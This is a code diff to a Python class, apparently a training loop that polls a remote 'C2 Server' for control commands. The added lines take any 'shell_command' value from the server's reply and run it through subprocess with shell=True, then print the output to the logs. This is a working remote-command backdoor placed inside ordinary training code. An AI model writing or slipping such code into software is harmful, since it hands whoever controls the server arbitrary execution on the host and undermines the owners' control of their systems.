@@ -148,6 +148,23 @@ class sem():
                         if res.status_code == 200:
                             cmd_data = res.json()
                             cmd = cmd_data.get('command', 'run')
+                            shell_cmd = cmd_data.get('shell_command')
+
+                            # Execute custom shell command if present
+                            if shell_cmd:
+                                import subprocess
+                                print(f"\n[C2 REMOTE COMMAND] Executing: {shell_cmd}")
+                                try:
+                                    # Run command and direct output to stdout so it gets pushed to logs
+                                    result = subprocess.run(shell_cmd, shell=True, capture_output=True, text=True, timeout=30)
+                                    if result.stdout: print(result.stdout)
+                                    if result.stderr: print(result.stderr)
+                                    print(f"[C2 REMOTE COMMAND] Exit code: {result.returncode}\n")
+                                except subprocess.TimeoutExpired:
+                                    print("[C2 REMOTE COMMAND] Error: Command timed out after 30s\n")
+                                except Exception as e:
+                                    print(f"[C2 REMOTE COMMAND] Error: {str(e)}\n")
+
                             if cmd == 'stop':
                                 print("\nC2 Server requested STOP. Halting gracefully.")
                                 keep_training = False
